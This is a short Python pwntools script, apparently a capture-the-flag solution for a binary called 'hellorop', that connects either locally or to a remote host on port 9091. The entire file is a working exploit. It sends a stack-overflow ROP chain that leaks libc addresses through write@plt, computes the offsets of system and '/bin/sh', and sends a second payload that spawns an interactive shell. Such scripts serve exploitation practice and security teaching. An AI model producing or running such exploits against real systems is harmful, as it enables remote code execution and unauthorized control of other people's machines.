from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./hellorop')
else :
	p = connect('inc0gnito.com', 9091)

# Gadget
pop_3_ret = 0x80484C9

# Address
main_addr = 0x804843B
write_plt = 0x8048320
read_got = 0x804A00C
write_got = 0x804A014

payload = 'A'*(0x64+4)
payload += p32(write_plt)
payload += p32(pop_3_ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(write_plt)
payload += p32(main_addr)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)

p.sendline(payload)

data = p.recv(0x64)
data = p.recv(4)
read_addr = u32(data)
print '[Exploit] read = '+hex(read_addr)

data = p.recv(4)
write_addr = u32(data)
print '[Exploit] write = '+hex(write_addr)

# read = 0xF7E6AB00
# write = 0xF7E6AB70
# libc: libc6_2.23-0ubuntu10_i386

libc_base = read_addr-0xD5B00
system_addr = libc_base+0x3ADA0
str_bin_sh_addr = libc_base+0x15BA0B

payload = 'A'*(0x64+4)
payload += p32(system_addr)
payload += 'A'*4
payload += p32(str_bin_sh_addr)

p.sendline(payload)

p.interactive()
